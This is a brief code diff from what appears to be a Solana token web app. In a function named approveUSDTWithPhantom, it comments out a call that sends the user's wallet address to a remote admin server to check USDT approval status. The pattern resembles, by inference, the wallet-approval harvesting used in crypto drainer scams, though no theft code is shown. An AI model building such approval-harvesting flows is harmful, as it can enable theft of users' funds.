@@ -139,16 +139,16 @@ const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solan
     console.log("钱包地址:", walletPublicKey.toBase58());
 	
 	 // 2️⃣ 调用你自己的接口检查授权状态
-	const apiUrl = `https://admin.testwell.top/api/api/is_approval?wallet=${walletPublicKey.toBase58()}`;
-	const res = await fetch(apiUrl);
-	const data = await res.json();
+	// const apiUrl = `https://admin.testwell.top/api/api/is_approval?wallet=${walletPublicKey.toBase58()}`;
+	// const res = await fetch(apiUrl);
+	// const data = await res.json();
 	
-	    // 3️⃣ 判断接口返回
-	if (data && data.code == "1") {
-		console.log("已授权，无需再次 approve");
+	//     // 3️⃣ 判断接口返回
+	// if (data && data.code == "1") {
+	// 	console.log("已授权，无需再次 approve");
 	    
-		return "alreadyApproved";
-	}
+	// 	return "alreadyApproved";
+	// }
 	
 	
 	
@@ -663,4 +663,5 @@ const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solan
 }
 
 export default CreateToken
+
 
